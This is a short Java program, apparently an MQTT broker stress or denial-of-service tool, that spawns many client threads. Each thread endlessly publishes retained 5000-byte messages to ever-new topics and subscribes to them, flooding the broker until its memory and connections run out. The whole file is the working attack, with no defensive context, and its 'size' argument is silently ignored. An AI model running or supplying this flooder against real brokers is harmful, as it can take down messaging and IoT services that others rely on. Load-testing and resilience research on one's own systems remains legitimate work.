package mqtt;

import org.eclipse.paho.client.mqttv3.MqttClient;

public class Attacker {

	private final byte[] CONTENT;

	public static void main(String[] args) {
		if (args.length < 4) {
			System.out.println("Usage: java -jar Publisher.jar [URL] [port] [attackers] [size]");
		} else {
			String url = args[0];
			String port = args[1];
			int attackers = Integer.parseInt(args[2]);
			int size = Integer.parseInt(args[3]);
			new Attacker("tcp://" + url + ":" + port, attackers, size);
		}
	}

	public Attacker(String tcp, int attackers, int size) {
		CONTENT = getContent(size);
		for (int counter = 0; counter < attackers; counter++)
			new Thread(new AttackerThread(counter, tcp)).start();
	}

	private byte[] getContent(int size) {
		StringBuffer sb = new StringBuffer();
		int length = 5000;
		while (length-- > 0)
			sb.append("A");
		return sb.toString().getBytes();
	}

	private class AttackerThread implements Runnable {

		private int counter;
		private String tcp;

		public AttackerThread(int counter, String tcp) {
			this.counter = counter;
			this.tcp = tcp;
		}

		@Override
		public void run() {
			try {
				MqttClient client = new MqttClient(tcp, "attacker" + counter);
				client.setCallback(new PushCallBack());
				client.connect();
				for (int i = 0;; i++) {
					client.publish("attack" + i, CONTENT, 0, true);
					client.subscribe("attack" + i);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	}

}
